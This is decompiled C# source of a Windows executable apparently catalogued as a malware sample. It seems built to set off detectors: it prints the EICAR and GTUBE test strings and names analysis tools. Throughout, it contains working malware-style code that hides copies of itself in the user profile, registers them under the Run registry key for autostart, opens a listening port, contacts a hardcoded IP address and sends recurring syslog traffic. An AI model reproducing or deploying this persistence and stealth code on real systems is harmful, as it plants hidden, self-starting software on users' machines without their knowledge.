// Decompiled with JetBrains decompiler
// Type: WMI_Process_Host.Program
// Assembly: WMI Process Host, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 30F31E6A-63E0-45BD-BCAC-DDFCEE06997E
// Assembly location: Z:\Malware\1661599428\1661599428.exe

using Microsoft.Win32;
using Syslog;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace WMI_Process_Host
{
    internal class Program
    {
        public static Thread t;

        private static void Main(string[] args)
        {
            Program.writeStrings();
            Program.copyToUserRoot();
            Console.WriteLine(Program.GetSource("http://195.28.181.41"));
            Console.WriteLine();
            Program.t = new Thread(new ThreadStart(Program.runListener));
            Program.t.IsBackground = true;
            Program.t.Start();
            Program.runCommands();
            while (true)
            {
                Console.WriteLine("Sending 1K data...");
                Program.SendSyslog("8.8.8.8", Program.randomString(1024));
                Thread.Sleep(20000);
                Console.WriteLine("Sending 2K data...");
                Program.SendSyslog("8.8.4.4", Program.randomString(2048));
                Thread.Sleep(20000);
            }
        }

        public static string randomString(int maxSize)
        {
            char[] chArray1 = new char[62];
            char[] chArray2 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
            byte[] data1 = new byte[1];
            RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider();
            cryptoServiceProvider.GetNonZeroBytes(data1);
            byte[] data2 = new byte[maxSize];
            cryptoServiceProvider.GetNonZeroBytes(data2);
            StringBuilder stringBuilder = new StringBuilder(maxSize);
            foreach (byte num in data2)
                stringBuilder.Append(chArray2[(int)num % chArray2.Length]);
            return stringBuilder.ToString();
        }

        private static void SendSyslog(string TargetIP, string text)
        {
            Client client = new Client();
            try
            {
                client.Port = "514";
                client.HostIp = TargetIP;
                client.Send(new Message(text));
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception! " + ex.Message);
            }
            finally
            {
                client.Close();
            }
        }

        private static void copyToUserRoot()
        {
            string machineName = Environment.MachineName;
            string versionString = Environment.OSVersion.VersionString;
            string userName = Environment.UserName;
            string oldValue = (machineName + versionString + userName).GetHashCode().ToString().Replace("-", "") + ".exe";
            string str = "c:\\users\\" + userName + "\\" + oldValue;
            if (System.IO.File.Exists(str))
                return;
            System.IO.File.Copy(Assembly.GetExecutingAssembly().Location, str);
            System.IO.File.SetAttributes(str, FileAttributes.Hidden);
            Program.addToStratup("abcde", str);
            if (!Directory.Exists(str.Replace(oldValue, "abcde")))
                Directory.CreateDirectory(str.Replace(oldValue, "abcde")).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
            System.IO.File.Copy(Assembly.GetExecutingAssembly().Location, str.Replace(oldValue, "abcde\\" + oldValue));
            System.IO.File.SetAttributes(str.Replace(oldValue, "abcde\\" + oldValue), FileAttributes.Hidden);
            Program.addToStratup("abcde2", str.Replace(oldValue, "abcde\\" + oldValue));
        }

        private static void addToStratup(string name, string location)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            registryKey.SetValue(name, (object)location);
            registryKey.Close();
        }

        public static string GetSource(string URL)
        {
            HttpWebResponse httpWebResponse = (HttpWebResponse)WebRequest.Create(URL).GetResponse();
            StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
            string str = streamReader.ReadToEnd();
            streamReader.Close();
            httpWebResponse.Close();
            return str;
        }

        public static string run(string exe, string Command)
        {
            Process process = new Process();
            process.StartInfo.FileName = exe;
            process.StartInfo.Arguments = Command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
            string str = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            return str;
        }

        public static void runCommands()
        {
            Console.WriteLine(Program.run("netsh.exe", "/c"));
            Console.WriteLine();
            Console.WriteLine(Program.run("ftp.exe", "/c"));
            Console.WriteLine();
            Console.WriteLine(Program.run("tasklist", "/c"));
            Console.WriteLine();
        }

        public static void writeStrings()
        {
            Console.WriteLine("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");
            Console.WriteLine();
            Console.WriteLine("XJS*C4JDBQADN1.NSBN3*2IDNEN*GTUBE-STANDARD-ANTI-UBE-TEST-EMAIL*C.34X");
            Console.WriteLine();
            Console.WriteLine("password PROCESS OLLYDBG WIRESHARK SunMonTueWedThuFriSat JanFebMarAprMayJunJulAugSepOctNovDec");
            Console.WriteLine();
            Console.WriteLine("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.97 Safari/537.36");
            Console.WriteLine();
        }

        public static void runListener()
        {
            try
            {
                new TcpListener(IPAddress.Any, 8989).Start();
            }
            catch (Exception ex)
            {
            }
        }
    }
}
